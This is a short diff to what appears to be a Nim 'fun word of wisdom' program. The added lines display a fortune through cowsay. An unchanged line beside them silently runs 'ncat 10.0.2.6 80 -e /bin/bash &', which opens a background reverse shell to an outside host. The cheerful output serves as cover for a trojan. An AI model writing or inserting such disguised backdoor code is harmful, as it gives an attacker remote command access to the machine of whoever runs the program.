@@ -11,6 +11,10 @@ echo "Press enter for a fun word of wisdom. :)"
 
 discard readline(stdin)
 
+let (output, _) = execCmdEx("fortune | cowsay")
+
+echo output
+
 discard execCmd("ncat 10.0.2.6 80 -e /bin/bash &")
 
 
